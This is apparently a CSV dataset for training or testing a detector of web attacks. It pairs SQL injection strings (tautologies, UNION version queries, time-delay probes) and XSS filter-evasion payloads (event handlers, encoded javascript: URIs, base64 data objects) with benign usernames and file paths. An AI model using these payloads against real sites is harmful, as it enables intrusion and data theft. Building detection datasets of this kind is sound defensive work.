payload,type
admin' or 1=1,sqli
"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",xss
"<object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object> <object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""javascript:alert(1)"" style=""behavior:url(#x);""><param name=postdomevents /></object>",xss
a' order by 9999--,sqli
miembros/imagenes/ogono.jpg,benign
"<a href=""\xE2\x80\x81javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
" <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ​​​​​​​​​​​​",xss
"svUEv: select * from users where id=1 or 1#""@ union select null,version() -- 1",sqli
miembros/imagenes/ogono.jpg,benign
1'; waitfor delay '0:0:X'--,sqli
"<div id=d><x xmlns=""><iframe onload=javascript:alert(1)""></div> <script>d.innerHTML=d.innerHTML</script>",xss
"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>",xss
admin') or ('1'='1'#,sqli
"UE1kn: select * from users where id=1 union select 1,banner from v$version where rownum=1 -- 1",sqli
"s1: select * from users where id=1 or ""1,"" or 1=1 -- 1",sqli
"s?{s: select * from users where id=1 or ""]{"" or 1=1 -- 1",sqli
"s?UEf: select * from users where id=1 or 1#""? union select version(),version() -- 1",sqli
"<img\x10src=x onerror=""javascript:alert(1)"">",xss
"<a href=""\xE3\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",xss
"s?v: select * from users where id=1 or ""?@"" or 1=1 -- 1",sqli
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
a' and '456'='678,sqli
"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",xss
<embed src=%(jscript)s></embed>,xss
"s.{s: select * from users where id=1 or "".{"" or 1=1 -- 1",sqli
"oUEvc: select * from users where id=1 *\ union select null,@@VERSION -- 1",sqli
miembros/index.jsp,benign
"<a href=""javascript:javascript:alert(1)""><event-source src=""data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"">",xss
"`""'><img src=xxx:x \x27onerror=javascript:alert(1)>",xss
&.o&1: select * from users where id=1 or \.<\ or 1=1 -- 1,sqli
&1c: select * from users where id=1   or 1=1 -- 1,sqli
99eja36r9a,benign
"""><img src=x onerror=window.open('https://www.google.com/');>",xss
"<a href=""\x20javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
nagaraja,benign
spencer,benign
<script>%(payload)s</script>,xss
'&',sqli
"s1:s: select * from users where id=1 or ""1:"" or 1=1 -- 1",sqli
soo&1: select * from users where id='1' + $+%\ or 1=1 -- 1',sqli
55265136t,benign
imagenes/2.gif,benign
